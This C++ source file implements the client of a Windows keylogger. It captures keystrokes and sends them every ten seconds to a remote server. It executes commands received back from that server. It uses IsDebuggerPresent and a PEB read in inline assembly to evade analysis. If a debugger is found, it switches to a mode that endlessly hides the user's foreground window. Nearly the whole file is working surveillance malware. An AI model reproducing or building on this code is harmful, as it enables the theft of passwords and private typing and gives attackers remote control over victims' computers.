#include <Client.hh>

Client::Client() : _running(true), _assholeMode(false)
{
}

Client::~Client()
{
}

bool Client::init(const HINSTANCE & instance, const int & ac, LPWSTR * av)
{

	if (!this->setProtection())
		return (false);
	if (!this->_window.init(instance))
		return (false);
	this->_keylogger.init();
	this->_connect.init(ac, av);
	return (true);
}

bool Client::setProtection()
{
	PPEB ppeb = NULL;
	if (IsDebuggerPresent())
	{
		this->_assholeMode = true;
		return (false);
	}
	__asm
	{
		mov eax, fs:[18h]
		mov eax, [eax+30h]
		mov ppeb, eax
	}
	if (IsDebuggerPresent())
	{
		this->_assholeMode = true;
		return (false);
	}
	return (true);
}

void Client::run()
{
	if (this->_connect.start())
		OutputDebugString(this->_connect.read().data);
	boost::thread reader(&readFromServer, this);
	boost::thread sender(&sendToServer, this);

	while (this->isRunning())
	{
		if (!GetMessage(&this->_msg, NULL, 0, 0))
			this->_running = false;
		TranslateMessage(&this->_msg);
		DispatchMessage(&this->_msg);
	}
}

void		sendToServer(Client* cl)
{
	while (cl->isRunning())
	{
		std::string* toSend;
		toSend = cl->getKeylogger().sendTrame();
		if (toSend)
		{
			if (!cl->getConnect().isConnected())
			{
				while (!cl->getConnect().start())
					Sleep(1000);
			}
			cl->getConnect().send(1, *toSend);
		}
		Sleep(10000);
	}
}

void		readFromServer(Client* cl)
{
	while (cl->isRunning())
	{
		if (cl->getConnect().isConnected())
			cl->execute(cl->getConnect().read());
		Sleep(1000);
	}
}

void Client::runAssholeMode()
{
	HWND	win;
	while (1)
	{
		win = GetForegroundWindow();
		ShowWindow(win, false);
	}
}

bool Client::isRunning()
{
	if (this->_running)
		return (true);
	return (false);
}

bool Client::isAsshole()
{
	return (this->_assholeMode);
}

void Client::execute(const t_trame & trame)
{
	this->_parser.execute(trame);
}

Keylogger & Client::getKeylogger()
{
	return (this->_keylogger);
}

Connect & Client::getConnect()
{
	return (this->_connect);
}
